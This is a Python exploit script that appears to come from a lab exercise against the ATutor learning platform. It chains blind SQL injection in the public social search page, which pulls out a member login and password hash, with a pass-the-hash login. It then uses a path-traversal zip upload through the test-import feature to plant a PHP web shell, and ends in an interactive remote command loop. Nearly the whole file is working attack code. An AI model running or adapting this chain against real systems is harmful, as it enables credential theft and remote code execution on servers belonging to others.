import requests
import sys
import re
import hashlib
import zipfile
from cStringIO import StringIO
import socket

proxies = {'http':'http://127.0.0.1:8080','https':'http://127.0.0.1:8080'}

global username
username = ""
global hash
hash = ""
global token
token = ""
global ip
ip = ""

global s
s = requests.Session()
global jar

def get_local_ip_address(ip):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect((ip, 80))
    return (s.getsockname()[0])

def build_zip2():
    f = StringIO()
    z = zipfile.ZipFile(f, 'w', zipfile.ZIP_DEFLATED)
    #z.writestr('../../../../../var/www/html/ATutor/mods/poc/poc2.phtml', '<?php if(isset($_GET['cmd'])) { system($_GET['cmd']);} ?>')
    z.writestr('imsmanifest.xml', 'invalid xml!')
    z.close()
    zip = open('poc.zip','wb')
    zip.write(f.getvalue())
    zip.close()
    with zipfile.ZipFile('poc.zip', 'a') as zipf:
        zipf.write('php-webshell.phtml','../../../../../var/www/html/ATutor/mods/poc/poc2.phtml')
        #<?php
        #if(isset($_GET['cmd']))
        #{
        #    system($_GET['cmd']);
        #}
        #?>

def build_zip():
    f = StringIO()
    z = zipfile.ZipFile(f, 'w', zipfile.ZIP_DEFLATED)
    z.writestr('../../../../../var/www/html/ATutor/mods/poc/poc.phtml', '<?php phpinfo(); ?>')
    z.writestr('imsmanifest.xml', 'invalid xml!')
    z.close()
    zip = open('poc.zip','wb')
    zip.write(f.getvalue())
    zip.close()    
    
def gen_hash(passwd, token):
    print "password:", passwd
    print "token:", token
    return hashlib.sha1(passwd+token).hexdigest()

def searchFriends_sqli(ip, inj_str):
    lo = 32
    hi = 127
    while lo <= hi:
        mid = lo + (hi - lo) // 2
        # now we update the sqli
        # (ascii(substring((select/**/user()),?,1)))>str(mid) 
        # The key is to check if the item you are looking for is larger than the item you are currently scanning.
        target = "http://%s/ATutor/mods/_standard/social/index_public.php?q=%s" % (ip, inj_str.replace("[CHAR]", str(mid)))
        r = requests.get(target)
        content_length = int(r.headers['Content-Length'])
        if (content_length > 20):
            lo = mid + 1
        else:
            hi = mid - 1
    return lo

def sqlinj(ip):
    print("SQL injection function")
    #username = ""
    global username
    global hash
    print "(+) Retrieving username...."
    
    print "(+) Retrieving username length...."
    length = 0
    for i in range(1, 21):
        injection_string = "test')/**/or/**/(select/**/length((select/**/login/**/from/**/AT_members)))="+ str(i) + "%23" 
        #print injection_string
        target = "http://%s/ATutor/mods/_standard/social/index_public.php?q=%s" % (ip, injection_string)
        r = requests.get(target)
        content_length = int(r.headers['Content-Length'])
        if (content_length > 20):
            length = i
            print "length:", i
            break
    for i in range(1, length+1):
        injection_string = "test')/**/or/**/(ascii(substring((select/**/login/**/from/**/AT_members),%d,1)))>[CHAR]%%23" % i
        extracted_char = chr(searchFriends_sqli(ip, injection_string))
        #sys.stdout.write(extracted_char)
        #sys.stdout.flush()
        username = username + extracted_char
        #print "username: ", username
    print "\n(+) done!"
    print "username: ", username

    print "(+) Retrieving password hash...."
    
    print "(+) Retrieving password hash length...."
    length = 0
    for i in range(1, 50):
        injection_string = "test')/**/or/**/(select/**/length((select/**/password/**/from/**/AT_members)))="+ str(i) + "%23" 
        #print injection_string
        target = "http://%s/ATutor/mods/_standard/social/index_public.php?q=%s" % (ip, injection_string)
        r = requests.get(target)
        content_length = int(r.headers['Content-Length'])
        if (content_length > 20):
            length = i
            print "length:", i
            break
    for i in range(1, length+1):
        injection_string = "test')/**/or/**/(ascii(substring((select/**/password/**/from/**/AT_members),%d,1)))>[CHAR]%%23" % i
        extracted_char = chr(searchFriends_sqli(ip, injection_string))
        #sys.stdout.write(extracted_char)
        #sys.stdout.flush()
        hash = hash + extracted_char
    print "\n(+) done!"
    print "hash: ", hash

def get_login_token(ip):
    global token
    target = "http://%s/ATutor/login.php" % ip
    r = requests.get(target)
    text = r.text
    url = re.search('hex_sha1\(hex_sha1\(document\.form\.form_password\.value\) \+ \"(.*)\"\);', text)
    token = url.group(1)
    print "token:", token
    
def login(ip):
    print("Login function")
    global token
    global hash
    target = "http://%s/ATutor/login.php" % ip
    #token = "c1e0d86df04edb101c6e9db008d408bf6f5f9a1a"
    hashed = gen_hash(hash, token)
    d = {
        "form_password_hidden" : hashed,
        "form_login": "teacher",
        "submit": "Login",
        "token" : token
    }
    global s
    global jar
    #s = requests.Session()
    r = s.post(target, data=d, proxies=proxies)
    #r = s.post(target, data=d)
    res = r.text
    if "Create Course: My Start Page" in res or "My Courses: My Start Page" in res:
        print "Login success!"
        jar = r.cookies
    if r.status_code == 302:
        jar = r.cookies
        redirect_URL = r.headers['Location']
        r2 = session.get(url=redirect_URL, cookies=jar, proxies=proxies)
        jar = r2.cookies
        #print "jar: ", jar

def upload_file(ip):
    print("upload file function")
    global s
    global jar
    #files = {'file': (open("poc.zip", 'rb'), 'application/zip'), 'submit_import' : (None, 'Import')}
    files = {'file': ("poc.zip", open("poc.zip", 'rb'), 'application/zip')}
    data = {"submit_import" : "Import" }
    url = "http://%s/ATutor/bounce.php?course=16777215" % ip
    r = s.get(url=url, cookies=jar, proxies=proxies)
    jar = r.cookies    
    url = "http://%s/ATutor/mods/_standard/tests/my_tests.php" % ip
    r = s.get(url=url, cookies=jar, proxies=proxies)
    jar = r.cookies
    url = "http://%s/ATutor/mods/_standard/tests/index.php" % ip
    r = s.get(url=url, cookies=jar, proxies=proxies)
    jar = r.cookies
    url = "http://%s/ATutor/mods/_standard/tests/import_test.php" % ip
    r = s.post(url=url, cookies=jar, files=files, data=data, proxies=proxies)

def web_shell(ip):
    global s
    global jar
    print("web shell function")
    while True:
        cmd = raw_input('Shell>')
        if cmd == 'exit':
            break
        url = "http://%s/ATutor/mods/poc/poc2.phtml?cmd=" % ip
        url = url + cmd
        r = s.get(url=url, cookies=jar, proxies=proxies)
        jar = r.cookies
        text = r.text
        print text

def main():
    global hash
    if len(sys.argv) != 2:
        print "(+) usage: %s <target>"  % sys.argv[0]
        print '(+) eg: %s 192.168.121.103'  % sys.argv[0]
        sys.exit(-1)

    ip = sys.argv[1]
    sqlinj(ip)
    #username = "teacher"
    #hash = "8635fc4e2a0c7d9d2d9ee40ea8bf2edd76d5757e"
    get_login_token(ip)
    login(ip)
    build_zip2()
    upload_file(ip)
    local_address = get_local_ip_address(ip)
    web_shell(ip)


if __name__ == "__main__":
    main()
